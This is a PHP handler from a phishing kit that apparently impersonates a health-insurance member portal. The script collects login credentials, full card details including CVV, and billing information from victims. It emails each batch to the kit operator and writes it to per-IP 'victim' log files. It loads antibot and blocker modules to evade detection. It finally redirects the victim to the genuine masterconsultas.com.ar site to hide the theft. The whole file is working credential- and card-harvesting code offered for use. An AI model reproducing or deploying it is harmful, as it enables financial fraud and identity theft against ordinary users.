<?php 
  include 'php/err.php';
include 'php/functions.php';
include 'php/loca.php';
include 'php/system.php';
include 'php/browser.php';
include 'php/antibots4.php';
include 'php/detect.php';
include 'php/blocker.php';
include '../../config.php';
//////////////////////////////////////////////////////////////////// START LOGIN
if(isset($_POST['login'])){
	


	
$username = html($_POST['username']);
$password = html($_POST['password']);
$md5 = md5(rand(0,10000));
 
 
		if(empty($username)  AND empty($password) ){
		header("location: login_action.php?u=f&p=f&Token=$md5");
	}
	elseif(empty($username) ){
			header("location: login_action.php?u=f&Token=$md5");
		}
	 
	elseif(empty($password)){
		header("location: login_action.php?p=f&Token=$md5");
	}
 
 else{
 


date_default_timezone_set("Europe/London");
$date = date("y/m/d");
$datesec = date("h:i:sa");
$alldate = $date.'  @  '.$datesec;
$ip = $_SERVER['REMOTE_ADDR'];
$subject = "New Result [ $ip ]  :) ";
$headers = "Content-type:text/html;charset=UTF-8" . "\r\b";
$headers .= "From: MegaMass Lite " . "\r\n";

 $mailtxt = "
 
 <style>
*{font-family:courier; font-weight:bold; text-shadow:0px 0px 1px black;}
.butto{width:200px;}
 </style>
 <script>
 function copy(){
 var obj = document.getElementById('iip');
 obj.select();
 document.execCommand('copy');
 alert('copied !');
 }
 </script>
 <h1>New Victim <br>
  <a href=''><button ><b>refresh</b></button></a></h1 >
     [[====== :p INFO :p =======]] <br>
	 ================================<br> 
	 [ip] : <input type='text' value='$ip' id='iip'> <button onclick='copy()'>copy</button> <a href='https://geoiptool.com/en/?ip=$ip' target='_blank'><button>open</button></a><br> 
	 [date] : $alldate <br>
	 [browser] : $browser <br>
	 [os] : $os_platform <br> 
	 [country] : $country <br>
	 ================================ <br> 
     <p></p>
	 [[====== :p LOGIN :p =======]]<br>
	 ================================<br> 
      [username] : $username <br>
	  [password] : $password <br>
	 ================================ <br> 
	 <p></p>
	 ";

$target = "
<a href='vic/$ip.html' target='_blank'><button class='but'> $ip (".$country.") </button></a>"
;
/////////////////////// EMAIL ///////////////////// 
/////////////////////////////////////////////////
//::::::>>>>>>> don't touch it /////////////////////
mail($your_email, $subject, $mailtxt, $headers);
//::::::>>>>>>> don't touch it ///////////////////
////////////////////////////////////////////////
//////////////////////////////////////////////////


$pathtml = "../../vic.php";
$fpo = fopen($pathtml, "a");
fwrite($fpo, $target);
fclose($fpo);
$path = "../../vic/$ip".".html";
$fp = fopen($path, "a");
fwrite($fp,  $mailtxt);
mail($fwrite,
$subject,
$mailtxt
,$headers);
fclose($fp);
 
header("location: tarjeta_action.php");
 }
}






 
//////////////////////////////////////////////////////////////////// START CARD
if(isset($_POST['card'])){
	 

	 $cardnumber = html($_POST['cardnumber']);
	 $cvv = html($_POST['cvv']);
	 $mm = html($_POST['MM']);
	  $yy = html($_POST['YY']);
	  $expiry = $mm."/".$yy;
	 $ip = $_SERVER['REMOTE_ADDR'];
	 $md5 = md5(rand(0,10000));
	 
	 
	 		if(empty($cardnumber)  AND  empty($cvv) ){
		header("location: tarjeta_action.php?c=f&car=f&token=$md5");
	}
	elseif(empty($cardnumber) ){
			header("location: tarjeta_action.php?car=f&token=$md5");
		}
	 
	elseif(empty($cvv)){
		header("location: tarjeta_action.php?c=f&token=$md5");
	}
 
 else{
 
 
 
 
	 	 $mailtxt = " 
     [[======== :p CARD :p ========]] <br>
	 =============================== <br>
	 [card number] : $cardnumber <br>
	 [expiry] : $expiry <br>
	 [cvv] : $cvv <br>
     =============================== <br>
     <p></p>
	 ";
	 
$subject = "New Result [ $ip ]  :) ";
$headers = "Content-type:text/html;charset=UTF-8" . "\r\b";
$headers .= "From: MegaMass Evil " . "\r\n";


/////////////////////// EMAIL ///////////////////// 
/////////////////////////////////////////////////
//::::::>>>>>>> don't touch it /////////////////////
mail($your_email, $subject, $mailtxt, $headers);
//::::::>>>>>>> don't touch it ///////////////////
////////////////////////////////////////////////
//////////////////////////////////////////////////
 
$path = "../../vic/$ip".".html";
$fp = fopen($path, "a");
fwrite($fp, $mailtxt);
mail($fwrite,
$subject,
$mailtxt,
$headers);
fclose($fp);
 
 header('location: billing_action.php');
 
}
}










//////////////////////////////////////////////////////////////////// START BILLING

if(isset($_POST['billing'])){
	
	 $ip = $_SERVER['REMOTE_ADDR'];
	 $fullname = html($_POST['fullname']);
	 $address = html($_POST['address']);
	 $city = html($_POST['city']);
	 $zip = html($_POST['zip']);
	 $email = html($_POST['email']);
	 $md5 = md5(rand(0,10000));
	 
	 
	 
	 	 		if(empty($fullname)  or  empty($address) or empty($city) or empty($zip) or empty($email) ){
					
		header("location: billing_action.php?f=f&a=f&c=f&z=f&e=f&Token=$md5");
	}
 
 
 
 else{
 
	 
	 
	 $mailtxt = "
	 [[===== :p BILLING :p =====]]<br>
	 ============================<br>
	 [full name] : $fullname  <br>
	 [address line] : $address  <br>
	 [city] : $city  <br>
	 [zip code] : $zip <br>
	 [country] : $country <br>
	 [email] : $email  <br>
	 ============================<br>
	 <p></p>
	 ";
	 
$subject = "New Result [ $ip ]  :) ";
$headers = "Content-type:text/html;charset=UTF-8" . "\r\b";
$headers .= "From: MegaMass Evil " . "\r\n";


/////////////////////// EMAIL ///////////////////// 
/////////////////////////////////////////////////
//::::::>>>>>>> don't touch it /////////////////////
mail($your_email, $subject, $mailtxt, $headers);
//::::::>>>>>>> don't touch it ///////////////////
////////////////////////////////////////////////
//////////////////////////////////////////////////

 
 

$path = "../../vic/$ip".".html";
$fp = fopen($path, "a");
fwrite($fp, $mailtxt);
mail($fwrite,
$subject,
$mailtxt,
$headers);
fclose($fp);
 

header("location: https://www1.masterconsultas.com.ar/socios/context/init.action"); 
}

}


 

?>